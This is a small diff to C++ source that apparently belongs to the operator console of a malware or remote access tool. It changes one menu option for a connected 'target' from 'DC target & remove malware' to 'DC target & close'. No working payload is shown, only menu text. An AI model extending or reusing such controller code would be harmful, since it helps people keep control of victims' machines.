@@ -524,7 +524,7 @@ char Get_menu_option()
                                     
     if(targetconnected)cout << R"(
                                     Make Target try again after 5 sec      [~]
-                                    DC target & remove malware             {#}
+                                    DC target & close                      {#}
                                                                             )";
 
     cout << R"(
